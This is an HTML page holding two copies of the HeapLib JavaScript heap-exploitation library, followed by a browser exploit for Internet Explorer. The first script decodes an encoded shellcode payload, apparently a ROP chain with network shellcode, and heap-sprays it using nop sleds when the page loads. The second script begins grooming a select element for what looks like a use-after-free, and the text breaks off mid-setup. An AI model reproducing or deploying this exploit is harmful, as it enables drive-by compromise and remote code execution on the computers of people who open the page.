<html><head>
<meta http-equiv="content-type" content="text/html; charset=windows-1252">
<script language="javascript">
//
//   JavaScript Heap Exploitation library
//   by Alexander Sotirov <asotirov@determina.com>
//  
//   Version 0.3
//
// Copyright (c) 2007, Alexander Sotirov
// All rights reserved.
// 
// The HeapLib library is licensed under a BSD license, the text of which follows:
// 
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions
// are met:
// 
// 1. Redistributions of source code must retain the above copyright
//    notice, this list of conditions and the following disclaimer.
// 2. Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in the
//    documentation and/or other materials provided with the distribution.
// 3. Neither the name of Alexander Sotirov nor the name of Determina Inc.
//    may be used to endorse or promote products derived from this software
//    without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
// ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.
//
 
//
// heapLib namespace
//

function heapLib() {
}


//
// heapLib class
//

// heapLib.ie constructor
//
// Creates a new heapLib API object for Internet Explorer. The maxAlloc
// argument sets the maximum block size that can be allocated using the alloc()
// function.
//
// Arguments:
//    maxAlloc - maximum allocation size in bytes (defaults to 65535)
//    heapBase - base of the default process heap (defaults to 0x150000)
//

heapLib.ie = function(maxAlloc, heapBase) {

this.maxAlloc = (maxAlloc ? maxAlloc : 65535);
this.heapBase = (heapBase ? heapBase : 0x150000);

// Allocate a padding string that uses maxAlloc bytes
this.paddingStr = "AAAA";

for (;4 + this.paddingStr.length*2 + 2 < this.maxAlloc;) {
    this.paddingStr += this.paddingStr;
}

// Create an array for storing references to allocated memory
this.mem = new Array();

// Call flushOleaut32() once to allocate the maximum size blocks
this.flushOleaut32();
}


//
// Outputs a debugging message in WinDbg. The msg argument must be a string
// literal. Using string concatenation to build the message will result in heap
// allocations.
//
// Arguments:
//    msg - string to output
//

heapLib.ie.prototype.debug = function(msg) {
void(Math.atan2(0xbabe, msg));
}


//
// Enables or disables logging of heap operations in WinDbg.
//
// Arguments:
//    enable - a boolean value, set to true to enable heap logging
//

heapLib.ie.prototype.debugHeap = function(enable) {

if (enable == true)
    void(Math.atan(0xbabe));
else
    void(Math.asin(0xbabe));
}


//
// Triggers a breakpoint in the debugger.
//

heapLib.ie.prototype.debugBreak = function(msg) {
void(Math.acos(0xbabe));
}


//
// Returns a string of a specified length, up to the maximum allocation size
// set in the heapLib.ie constructor. The string contains "A" characters.
//
// Arguments:
//    len - length in characters
//

heapLib.ie.prototype.padding = function(len) {
if (len > this.paddingStr.length)
    throw "Requested padding string length " + len + ", only " + this.paddingStr.length + " available";

return this.paddingStr.substr(0, len);
}


//
// Returns a number rounded up to a specified value.
//
// Arguments:
//    num   - integer to round
//    round - value to round to
//

heapLib.ie.prototype.round = function(num, round) {
if (round == 0)
    throw "Round argument cannot be 0";

return parseInt((num + (round-1)) / round) * round;
}


//
// Converts an integer to a hex string. This function uses the heap.
//
// Arguments:
//    num   - integer to convert
//    width - pad the output with zeros to a specified width (optional)
//

heapLib.ie.prototype.hex = function(num, width)
{
var digits = "0123456789ABCDEF";

var hex = digits.substr(num & 0xF, 1);

while (num > 0xF) {
    num = num >>> 4;
    hex = digits.substr(num & 0xF, 1) + hex;
}

var width = (width ? width : 0);

while (hex.length < width)
    hex = "0" + hex;

return hex;
}


//
// Convert a 32-bit address to a 4-byte string with the same representation in
// memory. This function uses the heap.
//
// Arguments:
//    addr - integer representation of the address
//

heapLib.ie.prototype.addr = function(addr) {
return unescape("%u" + this.hex(addr & 0xFFFF, 4) + "%u" + this.hex((addr >> 16) & 0xFFFF, 4));
}


//
// Allocates a block of a specified size with the OLEAUT32 alloc function.
//
// Arguments:
//    arg - size of the new block in bytes, or a string to strdup
//    tag - a tag identifying the memory block (optional)
//

heapLib.ie.prototype.allocOleaut32 = function(arg, tag) {

var size;

// Calculate the allocation size
if (typeof arg == "string" || arg instanceof String)
    size = 4 + arg.length*2 + 2;    // len + string data + null terminator
else
    size = arg;

// Make sure that the size is valid
if ((size & 0xf) != 0)
    throw "Allocation size " + size + " must be a multiple of 16";

// Create an array for this tag if doesn't already exist
if (this.mem[tag] === undefined)
    this.mem[tag] = new Array();

if (typeof arg == "string" || arg instanceof String) {
    // Allocate a new block with strdup of the string argument
    this.mem[tag].push(arg.substr(0, arg.length));
}
else {
    // Allocate the block
    this.mem[tag].push(this.padding((arg-6)/2));
}
}


//
// Frees all memory blocks marked with a specific tag with the OLEAUT32 memory
// allocator.
//
// Arguments:
//    tag - a tag identifying the group of blocks to be freed
//

heapLib.ie.prototype.freeOleaut32 = function(tag) {

delete this.mem[tag];

// Run the garbage collector
CollectGarbage();
}


//
// The JScript interpreter uses the OLEAUT32 memory allocator for all string
// allocations. This allocator stores freed blocks in a cache and reuses them
// for later allocations. The cache consists of 4 bins, each storing up to 6
// blocks. Each bin holds blocks of a certain size range:
//
//    0 - 32
//    33 - 64
//    65 - 256
//    257 - 32768
//
// When a block is freed by the OLEAUT32 free function, it is stored in one of
// the bins. If the bin is full, the smallest block in the bin is freed with
// RtlFreeHeap() and is replaced with the new block. Chunks larger than 32768
// bytes are not cached and are freed directly.
//
// To flush the cache, we need to free 6 blocks of the maximum size for each
// bin. The maximum size blocks will push out all smaller blocks from the
// cache. Then we allocate the maximum size blocks again, leaving the cache
// empty.
//
// You need to call this function once to allocate the maximum size blocks
// before you can use it to flush the cache.
//

heapLib.ie.prototype.flushOleaut32 = function() {

this.debug("Flushing the OLEAUT32 cache");

// Free the maximum size blocks and push out all smaller blocks

this.freeOleaut32("oleaut32");

// Allocate the maximum sized blocks again, emptying the cache

for (var i = 0; i < 6; i++) {
    this.allocOleaut32(32, "oleaut32");
    this.allocOleaut32(64, "oleaut32");
    this.allocOleaut32(256, "oleaut32");
    this.allocOleaut32(32768, "oleaut32");
}
}


//
// Allocates a block of a specified size with the system memory allocator. A
// call to this function is equivalent to a call to HeapAlloc(). If the first
// argument is a number, it specifies the size of the new block, which is
// filled with "A" characters. If the argument is a string, its data is copied
// into a new block of size arg.length * 2 + 6. In both cases the size of the
// new block must be a multiple of 16 and not equal to 32, 64, 256 or 32768.
//
// Arguments:
//    arg - size of the memory block in bytes, or a string to strdup
//    tag - a tag identifying the memory block (optional)
//

heapLib.ie.prototype.alloc = function(arg, tag) {

var size;

// Calculate the allocation size
if (typeof arg == "string" || arg instanceof String)
    size = 4 + arg.length*2 + 2;    // len + string data + null terminator
else
    size = arg;

// Make sure that the size is valid
if (size == 32 || size == 64 || size == 256 || size == 32768)
    throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";

// Allocate the block with the OLEAUT32 allocator
this.allocOleaut32(arg, tag);
}


//
// Frees all memory blocks marked with a specific tag with the system memory
// allocator. A call to this function is equivalent to a call to HeapFree().
//
// Arguments:
//    tag - a tag identifying the group of blocks to be freed
//

heapLib.ie.prototype.free = function(tag) {

// Free the blocks with the OLEAUT32 free function
this.freeOleaut32(tag);

// Flush the OLEAUT32 cache
this.flushOleaut32();
}


//
// Runs the garbage collector and flushes the OLEAUT32 cache. Call this
// function before before using alloc() and free().
//

heapLib.ie.prototype.gc = function() {

this.debug("Running the garbage collector");
CollectGarbage();

this.flushOleaut32();
}


//
// Adds blocks of the specified size to the free list and makes sure they are
// not coalesced. The heap must be defragmented before calling this function.
// If the size of the memory blocks is less than 1024, you have to make sure
// that the lookaside is full.
//
// Arguments:
//    arg    - size of the new block in bytes, or a string to strdup
//    count  - how many free blocks to add to the list (defaults to 1)
//

heapLib.ie.prototype.freeList = function(arg, count) {

var count = (count ? count : 1);

for (var i = 0; i < count; i++) {
    this.alloc(arg);
    this.alloc(arg, "freeList");
}
this.alloc(arg);

this.free("freeList");
}


//
// Add blocks of the specified size to the lookaside. The lookaside must be
// empty before calling this function.
//
// Arguments:
//    arg    - size of the new block in bytes, or a string to strdup
//    count  - how many blocks to add to the lookaside (defaults to 1)
//

heapLib.ie.prototype.lookaside = function(arg, count) {

var size;

// Calculate the allocation size
if (typeof arg == "string" || arg instanceof String)
    size = 4 + arg.length*2 + 2;    // len + string data + null terminator
else
    size = arg;

// Make sure that the size is valid
if ((size & 0xf) != 0)
    throw "Allocation size " + size + " must be a multiple of 16";

if (size+8 >= 1024)
    throw("Maximum lookaside block size is 1008 bytes");

var count = (count ? count : 1);

for (var i = 0; i < count; i++)
    this.alloc(arg, "lookaside");

this.free("lookaside");
}


//
// Return the address of the head of the lookaside linked list for blocks of a
// specified size. Uses the heapBase parameter from the heapLib.ie constructor.
//
// Arguments:
//    arg - size of the new block in bytes, or a string to strdup
//

heapLib.ie.prototype.lookasideAddr = function(arg)
{
var size;

// Calculate the allocation size
if (typeof arg == "string" || arg instanceof String)
    size = 4 + arg.length*2 + 2;    // len + string data + null terminator
else
    size = arg;

// Make sure that the size is valid
if ((size & 0xf) != 0)
    throw "Allocation size " + size + " must be a multiple of 16";

if (size+8 >= 1024)
    throw("Maximum lookaside block size is 1008 bytes");

// The lookahead array starts at heapBase + 0x688. It contains a 48 byte
// structure for each block size + header size in 8 byte increments.

return this.heapBase + 0x688 + ((size+8)/8)*48;
}


//
// Returns a fake vtable that contains shellcode. The caller should free the
// vtable to the lookaside and use the address of the lookaside head as an
// object pointer. When the vtable is used, the address of the object must be
// in eax and the pointer to the vtable must be in ecx. Any virtual function
// call through the vtable from ecx+8 to ecx+0x80 will result in shellcode
// execution. This function uses the heap.
//
// Arguments:
//    shellcode - shellcode string
//    jmpecx    - address of a jmp ecx or equivalent instruction
//    size      - size of the vtable to generate (defaults to 1008 bytes)
//

heapLib.ie.prototype.vtable = function(shellcode, jmpecx, size) {

var size = (size ? size : 1008);

// Make sure the size is valid
if ((size & 0xf) != 0)
    throw "Vtable size " + size + " must be a multiple of 16";

if (shellcode.length*2 > size-138)
    throw("Maximum shellcode length is " + (size-138) + " bytes");

// Build the fake vtable that will go on the lookaside list
//
// lookaside ptr  jmp +124  addr of jmp ecx  sub [eax], al*2  shellcode       null
// 4 bytes        4 bytes   124 bytes        4 bytes          size-138 bytes  2 bytes

var vtable = unescape("%u9090%u7ceb")   // nop, nop, jmp + 124

for (var i = 0; i < 124/4; i++)
    vtable += this.addr(jmpecx);

// If the vtable is the only entry on the lookaside, the first 4 bytes will
// be 00 00 00 00, which disassembles as two add [eax], al instructions.
// The jmp ecx trampoline will jump back to the beginning of the vtable and
// execute the add [eax], al instructions. We need to use two sub [eax], al
// instructions to fix the heap.

vtable += unescape("%u0028%u0028") +    // two sub [eax], al instructions
          shellcode + heap.padding((size-138)/2 - shellcode.length);

return vtable;
}

var heap_obj = new heapLib.ie(0x10000);

var code = unescape("%uca70%u77c4%ub4c2%u76c9%uca73%u77c4%uca73%u77c4%uca73%u77c4%uca73%u77c4%uca73%u77c4%uca73%u77c4%uca73%u77c4%uca73%u77c4%uca73%u77c4%uca73%u77c4%uca73%u77c4%uca73%u77c4%ub860%u77c3%ufbff%uffff%ube18%u77c1%ue687%u4ad5%u362c%u77c2%ud9bb%u77c5%ue071%u77c2%u0d13%u77c5%uffc0%uffff%u8fbc%u77c5%ube18%u77c1%uda53%ud57e%u8fbc%u77c5%uee15%u77c3%uee15%u77c3%ueeef%u77c3%ud9bb%u77c5%ua88c%u77c2%u9f92%u77c3%ua184%u77c3%uaacc%u77c2%ub860%u77c3%u1120%u77c1%u2df9%u77c1%u5459%u77c3%uf99b%ufcf9%u9648%u9697%u2796%u4af9%uf527%u973f%u4093%uf89b%u4b49%u4741%u4a9f%ud63f%u4791%ud69b%u99f5%u4749%u9948%u434f%u4a43%ufc46%u2f91%u479f%u27f9%u3f4b%u4afd%u4e98%u4043%u994e%ufcf8%u962f%u9f9f%u4292%u2743%u49fd%u9790%u9699%u4897%u469f%u924b%u4346%ud6fc%u4791%u4193%u9847%u9190%u4397%u4990%ufc47%u4f3f%u9f98%u4641%u3790%u4147%u4827%u3796%u9946%u9137%u9727%uf94f%u4699%u4b41%u9b4a%ufd47%u93fc%uf841%u969f%uf54b%u9b48%ufc93%ufdf9%u93fc%u9693%u909b%u2f98%u9292%ufdf5%u4bf5%u9827%u9f4e%u9f41%uf84b%u4e42%u2f98%u9698%ufcf8%u4998%u2797%u934f%u4e49%u3f27%u962f%u3f49%u9191%uf948%u4992%u989f%u412f%u91fc%u9f9f%u2f9f%u9242%uf542%u919f%u983f%u9142%u484b%u93fd%u42fd%u9246%uf949%u9b98%u434f%uf8fd%u412f%u4a9f%u434a%u4140%u464f%ud647%ufd99%uf54f%u27f5%u999f%u9142%u3f99%u9697%u4afc%u4f42%u93d6%u999f%u9bfd%u9042%u3f99%u484e%u9f4f%u9227%u972f%u3f40%u37f5%u4b47%u9627%u404b%u91f8%u2f2f%uf997%u9893%u4e49%u2f47%u4847%u9bfd%u47f5%u962f%u9637%ud69f%u9337%u9696%u2f93%u9241%u3f97%u3f4a%u979f%u9390%u4047%u9637%u9f9f%u434e%ufdd6%uf991%u4a3f%u9742%u90fd%u3f48%uf590%ufd9f%ufc99%ufd97%u9f41%u40f8%u4741%u4f41%u9f37%u9391%u3743%u9937%u4ef8%u3791%u9797%u484b%u4093%u3797%u984b%u47d6%ufcf9%u4e9b%u4a9f%u4a4a%u469b%uf940%u4898%u274e%u9f43%ufd4b%u41f5%u4749%ufdfc%u9698%u43fd%u9341%u4b4a%u4a4b%u9fd6%u462f%u994a%u9192%uf94f%u9090%u929b%u47f9%u2f92%uf5fd%u97f9%u374f%u9946%uf53f%u9043%u3f42%u929b%u9099%u4a43%u4a9f%u91fc%u9740%u9f90%u909b%u4092%uf54f%ud62f%ufc91%ufcfd%u90f5%u4790%u4742%u4946%u462f%u90f5%u374f%u4237%u4890%u2727%uf592%u4649%u4392%u40d6%u3f9f%u4a92%u4f4f%u2f3f%u9893%uf593%ufd4f%u2ff8%u4f9b%u439b%ufc99%u41fd%u402f%u4e4e%ufc41%u4a4e%uf890%uf8f9%ufd93%u9b4b%u3747%u4e98%u422f%u91fc%u9048%ufd41%u9290%u462f%uf52f%u4e47%u903f%u9b49%u4990%u419f%u2ff9%u4241%uf9f5%uf999%u9b91%u2798%u37d6%u9197%u464b%u49f8%u4737%uf52f%u4afc%u9248%u934b%u4f90%u4a99%ufcfd%uf947%u4a2f%u4696%u4149%u4697%uf841%uf893%u9b43%u99fd%u4991%u404b%u4340%u9f47%u9792%u93fd%u2740%u4241%uf8f9%u46fc%u982f%u4947%u4190%u9292%u3793%u9191%ud637%u96fc%u984a%u4b90%u9f43%u4727%u2f48%u924b%u9246%ufcfd%u82e8%u0000%u6000%ue589%uc031%u8b64%u3050%u528b%u8b0c%u1452%u728b%u0f28%u4ab7%u3126%uacff%u613c%u027c%u202c%ucfc1%u010d%ue2c7%u52f2%u8b57%u1052%u4a8b%u8b3c%u114c%ue378%u0148%u51d1%u598b%u0120%u8bd3%u1849%u3ae3%u8b49%u8b34%ud601%uff31%uc1ac%u0dcf%uc701%ue038%uf675%u7d03%u3bf8%u247d%ue475%u8b58%u2458%ud301%u8b66%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424%u5b5b%u5961%u515a%ue0ff%u5f5f%u8b5a%ueb12%u5d8d%u3368%u0032%u6800%u7377%u5f32%u6854%u774c%u0726%ue889%ud0ff%u90b8%u0001%u2900%u54c4%u6850%u8029%u006b%ud5ff%u0a6a%u0a68%u0a0a%u6894%u0002%u5c11%ue689%u5050%u5050%u5040%u5040%uea68%udf0f%uffe0%u97d5%u106a%u5756%u9968%u74a5%uff61%u85d5%u74c0%uff0a%u084e%uec75%u67e8%u0000%u6a00%u6a00%u5604%u6857%ud902%u5fc8%ud5ff%uf883%u7e00%u8b36%u6a36%u6840%u1000%u0000%u6a56%u6800%ua458%ue553%ud5ff%u5393%u006a%u5356%u6857%ud902%u5fc8%ud5ff%uf883%u7d00%u5828%u0068%u0040%u6a00%u5000%u0b68%u0f2f%uff30%u57d5%u7568%u4d6e%uff61%u5ed5%uff5e%u240c%u850f%uff70%uffff%u9be9%uffff%u01ff%u29c3%u75c6%uc3c1%uf0bb%ua2b5%u6a56%u5300%ud5ff");
var VKOSahJShObqOQegRryHSlEmsjbLqYIzTfrPuDIzSRqayfIYDErJ = "%u0c0c%u0c0c";
var nops = unescape(VKOSahJShObqOQegRryHSlEmsjbLqYIzTfrPuDIzSRqayfIYDErJ);

while (nops.length < 0x1000) nops+= nops;
var shellcode =  nops.substring(0,0x800 - code.length) + code;
while (shellcode.length < 0x40000) shellcode += shellcode;

var block = shellcode.substring(2, (0x40000-0x21)/2);

heap_obj.gc();
for (var i=0; i < 600; i++) {
  heap_obj.alloc(block);
}


</script>

<script language="javascript">
  //
//   JavaScript Heap Exploitation library
//   by Alexander Sotirov <asotirov@determina.com>
//  
//   Version 0.3
//
// Copyright (c) 2007, Alexander Sotirov
// All rights reserved.
// 
// The HeapLib library is licensed under a BSD license, the text of which follows:
// 
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions
// are met:
// 
// 1. Redistributions of source code must retain the above copyright
//    notice, this list of conditions and the following disclaimer.
// 2. Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in the
//    documentation and/or other materials provided with the distribution.
// 3. Neither the name of Alexander Sotirov nor the name of Determina Inc.
//    may be used to endorse or promote products derived from this software
//    without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
// ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.
//
 
//
// heapLib namespace
//

function heapLib() {
}


//
// heapLib class
//

// heapLib.ie constructor
//
// Creates a new heapLib API object for Internet Explorer. The maxAlloc
// argument sets the maximum block size that can be allocated using the alloc()
// function.
//
// Arguments:
//    maxAlloc - maximum allocation size in bytes (defaults to 65535)
//    heapBase - base of the default process heap (defaults to 0x150000)
//

heapLib.ie = function(maxAlloc, heapBase) {

this.maxAlloc = (maxAlloc ? maxAlloc : 65535);
this.heapBase = (heapBase ? heapBase : 0x150000);

// Allocate a padding string that uses maxAlloc bytes
this.paddingStr = "AAAA";

for (;4 + this.paddingStr.length*2 + 2 < this.maxAlloc;) {
    this.paddingStr += this.paddingStr;
}

// Create an array for storing references to allocated memory
this.mem = new Array();

// Call flushOleaut32() once to allocate the maximum size blocks
this.flushOleaut32();
}


//
// Outputs a debugging message in WinDbg. The msg argument must be a string
// literal. Using string concatenation to build the message will result in heap
// allocations.
//
// Arguments:
//    msg - string to output
//

heapLib.ie.prototype.debug = function(msg) {
void(Math.atan2(0xbabe, msg));
}


//
// Enables or disables logging of heap operations in WinDbg.
//
// Arguments:
//    enable - a boolean value, set to true to enable heap logging
//

heapLib.ie.prototype.debugHeap = function(enable) {

if (enable == true)
    void(Math.atan(0xbabe));
else
    void(Math.asin(0xbabe));
}


//
// Triggers a breakpoint in the debugger.
//

heapLib.ie.prototype.debugBreak = function(msg) {
void(Math.acos(0xbabe));
}


//
// Returns a string of a specified length, up to the maximum allocation size
// set in the heapLib.ie constructor. The string contains "A" characters.
//
// Arguments:
//    len - length in characters
//

heapLib.ie.prototype.padding = function(len) {
if (len > this.paddingStr.length)
    throw "Requested padding string length " + len + ", only " + this.paddingStr.length + " available";

return this.paddingStr.substr(0, len);
}


//
// Returns a number rounded up to a specified value.
//
// Arguments:
//    num   - integer to round
//    round - value to round to
//

heapLib.ie.prototype.round = function(num, round) {
if (round == 0)
    throw "Round argument cannot be 0";

return parseInt((num + (round-1)) / round) * round;
}


//
// Converts an integer to a hex string. This function uses the heap.
//
// Arguments:
//    num   - integer to convert
//    width - pad the output with zeros to a specified width (optional)
//

heapLib.ie.prototype.hex = function(num, width)
{
var digits = "0123456789ABCDEF";

var hex = digits.substr(num & 0xF, 1);

while (num > 0xF) {
    num = num >>> 4;
    hex = digits.substr(num & 0xF, 1) + hex;
}

var width = (width ? width : 0);

while (hex.length < width)
    hex = "0" + hex;

return hex;
}


//
// Convert a 32-bit address to a 4-byte string with the same representation in
// memory. This function uses the heap.
//
// Arguments:
//    addr - integer representation of the address
//

heapLib.ie.prototype.addr = function(addr) {
return unescape("%u" + this.hex(addr & 0xFFFF, 4) + "%u" + this.hex((addr >> 16) & 0xFFFF, 4));
}


//
// Allocates a block of a specified size with the OLEAUT32 alloc function.
//
// Arguments:
//    arg - size of the new block in bytes, or a string to strdup
//    tag - a tag identifying the memory block (optional)
//

heapLib.ie.prototype.allocOleaut32 = function(arg, tag) {

var size;

// Calculate the allocation size
if (typeof arg == "string" || arg instanceof String)
    size = 4 + arg.length*2 + 2;    // len + string data + null terminator
else
    size = arg;

// Make sure that the size is valid
if ((size & 0xf) != 0)
    throw "Allocation size " + size + " must be a multiple of 16";

// Create an array for this tag if doesn't already exist
if (this.mem[tag] === undefined)
    this.mem[tag] = new Array();

if (typeof arg == "string" || arg instanceof String) {
    // Allocate a new block with strdup of the string argument
    this.mem[tag].push(arg.substr(0, arg.length));
}
else {
    // Allocate the block
    this.mem[tag].push(this.padding((arg-6)/2));
}
}


//
// Frees all memory blocks marked with a specific tag with the OLEAUT32 memory
// allocator.
//
// Arguments:
//    tag - a tag identifying the group of blocks to be freed
//

heapLib.ie.prototype.freeOleaut32 = function(tag) {

delete this.mem[tag];

// Run the garbage collector
CollectGarbage();
}


//
// The JScript interpreter uses the OLEAUT32 memory allocator for all string
// allocations. This allocator stores freed blocks in a cache and reuses them
// for later allocations. The cache consists of 4 bins, each storing up to 6
// blocks. Each bin holds blocks of a certain size range:
//
//    0 - 32
//    33 - 64
//    65 - 256
//    257 - 32768
//
// When a block is freed by the OLEAUT32 free function, it is stored in one of
// the bins. If the bin is full, the smallest block in the bin is freed with
// RtlFreeHeap() and is replaced with the new block. Chunks larger than 32768
// bytes are not cached and are freed directly.
//
// To flush the cache, we need to free 6 blocks of the maximum size for each
// bin. The maximum size blocks will push out all smaller blocks from the
// cache. Then we allocate the maximum size blocks again, leaving the cache
// empty.
//
// You need to call this function once to allocate the maximum size blocks
// before you can use it to flush the cache.
//

heapLib.ie.prototype.flushOleaut32 = function() {

this.debug("Flushing the OLEAUT32 cache");

// Free the maximum size blocks and push out all smaller blocks

this.freeOleaut32("oleaut32");

// Allocate the maximum sized blocks again, emptying the cache

for (var i = 0; i < 6; i++) {
    this.allocOleaut32(32, "oleaut32");
    this.allocOleaut32(64, "oleaut32");
    this.allocOleaut32(256, "oleaut32");
    this.allocOleaut32(32768, "oleaut32");
}
}


//
// Allocates a block of a specified size with the system memory allocator. A
// call to this function is equivalent to a call to HeapAlloc(). If the first
// argument is a number, it specifies the size of the new block, which is
// filled with "A" characters. If the argument is a string, its data is copied
// into a new block of size arg.length * 2 + 6. In both cases the size of the
// new block must be a multiple of 16 and not equal to 32, 64, 256 or 32768.
//
// Arguments:
//    arg - size of the memory block in bytes, or a string to strdup
//    tag - a tag identifying the memory block (optional)
//

heapLib.ie.prototype.alloc = function(arg, tag) {

var size;

// Calculate the allocation size
if (typeof arg == "string" || arg instanceof String)
    size = 4 + arg.length*2 + 2;    // len + string data + null terminator
else
    size = arg;

// Make sure that the size is valid
if (size == 32 || size == 64 || size == 256 || size == 32768)
    throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";

// Allocate the block with the OLEAUT32 allocator
this.allocOleaut32(arg, tag);
}


//
// Frees all memory blocks marked with a specific tag with the system memory
// allocator. A call to this function is equivalent to a call to HeapFree().
//
// Arguments:
//    tag - a tag identifying the group of blocks to be freed
//

heapLib.ie.prototype.free = function(tag) {

// Free the blocks with the OLEAUT32 free function
this.freeOleaut32(tag);

// Flush the OLEAUT32 cache
this.flushOleaut32();
}


//
// Runs the garbage collector and flushes the OLEAUT32 cache. Call this
// function before before using alloc() and free().
//

heapLib.ie.prototype.gc = function() {

this.debug("Running the garbage collector");
CollectGarbage();

this.flushOleaut32();
}


//
// Adds blocks of the specified size to the free list and makes sure they are
// not coalesced. The heap must be defragmented before calling this function.
// If the size of the memory blocks is less than 1024, you have to make sure
// that the lookaside is full.
//
// Arguments:
//    arg    - size of the new block in bytes, or a string to strdup
//    count  - how many free blocks to add to the list (defaults to 1)
//

heapLib.ie.prototype.freeList = function(arg, count) {

var count = (count ? count : 1);

for (var i = 0; i < count; i++) {
    this.alloc(arg);
    this.alloc(arg, "freeList");
}
this.alloc(arg);

this.free("freeList");
}


//
// Add blocks of the specified size to the lookaside. The lookaside must be
// empty before calling this function.
//
// Arguments:
//    arg    - size of the new block in bytes, or a string to strdup
//    count  - how many blocks to add to the lookaside (defaults to 1)
//

heapLib.ie.prototype.lookaside = function(arg, count) {

var size;

// Calculate the allocation size
if (typeof arg == "string" || arg instanceof String)
    size = 4 + arg.length*2 + 2;    // len + string data + null terminator
else
    size = arg;

// Make sure that the size is valid
if ((size & 0xf) != 0)
    throw "Allocation size " + size + " must be a multiple of 16";

if (size+8 >= 1024)
    throw("Maximum lookaside block size is 1008 bytes");

var count = (count ? count : 1);

for (var i = 0; i < count; i++)
    this.alloc(arg, "lookaside");

this.free("lookaside");
}


//
// Return the address of the head of the lookaside linked list for blocks of a
// specified size. Uses the heapBase parameter from the heapLib.ie constructor.
//
// Arguments:
//    arg - size of the new block in bytes, or a string to strdup
//

heapLib.ie.prototype.lookasideAddr = function(arg)
{
var size;

// Calculate the allocation size
if (typeof arg == "string" || arg instanceof String)
    size = 4 + arg.length*2 + 2;    // len + string data + null terminator
else
    size = arg;

// Make sure that the size is valid
if ((size & 0xf) != 0)
    throw "Allocation size " + size + " must be a multiple of 16";

if (size+8 >= 1024)
    throw("Maximum lookaside block size is 1008 bytes");

// The lookahead array starts at heapBase + 0x688. It contains a 48 byte
// structure for each block size + header size in 8 byte increments.

return this.heapBase + 0x688 + ((size+8)/8)*48;
}


//
// Returns a fake vtable that contains shellcode. The caller should free the
// vtable to the lookaside and use the address of the lookaside head as an
// object pointer. When the vtable is used, the address of the object must be
// in eax and the pointer to the vtable must be in ecx. Any virtual function
// call through the vtable from ecx+8 to ecx+0x80 will result in shellcode
// execution. This function uses the heap.
//
// Arguments:
//    shellcode - shellcode string
//    jmpecx    - address of a jmp ecx or equivalent instruction
//    size      - size of the vtable to generate (defaults to 1008 bytes)
//

heapLib.ie.prototype.vtable = function(shellcode, jmpecx, size) {

var size = (size ? size : 1008);

// Make sure the size is valid
if ((size & 0xf) != 0)
    throw "Vtable size " + size + " must be a multiple of 16";

if (shellcode.length*2 > size-138)
    throw("Maximum shellcode length is " + (size-138) + " bytes");

// Build the fake vtable that will go on the lookaside list
//
// lookaside ptr  jmp +124  addr of jmp ecx  sub [eax], al*2  shellcode       null
// 4 bytes        4 bytes   124 bytes        4 bytes          size-138 bytes  2 bytes

var vtable = unescape("%u9090%u7ceb")   // nop, nop, jmp + 124

for (var i = 0; i < 124/4; i++)
    vtable += this.addr(jmpecx);

// If the vtable is the only entry on the lookaside, the first 4 bytes will
// be 00 00 00 00, which disassembles as two add [eax], al instructions.
// The jmp ecx trampoline will jump back to the beginning of the vtable and
// execute the add [eax], al instructions. We need to use two sub [eax], al
// instructions to fix the heap.

vtable += unescape("%u0028%u0028") +    // two sub [eax], al instructions
          shellcode + heap.padding((size-138)/2 - shellcode.length);

return vtable;
}
  // 分配select元素selob 64个属性 
  var heap = new heapLib.ie();
  var selob = document.createElement("select")
selob.w0 = alert
selob.w1 = unescape("%u1bd0%u0c0c")
selob.w2 = alert
selob.w3 = alert
selob.w4 = alert
selob.w5 = alert
selob.w6 = alert
selob.w7 = alert
selob.w8 = alert
selob.w9 = alert
selob.w10 = alert
selob.w11 = alert
selob.w12 = alert
selob.w13 = alert
selob.w14 = alert
selob.w15 = alert
selob.w16 = alert
selob.w17 = alert
selob.w18 = alert
selob.w19 = alert
selob.w20 = alert
selob.w21 = alert
selob.w22 = alert
selob.w23 = alert
selob.w24 = alert
selob.w25 = alert
selob.w26 = alert
selob.w27 = alert
selob.w28 = alert
selob.w29 = alert
selob.w30 = alert
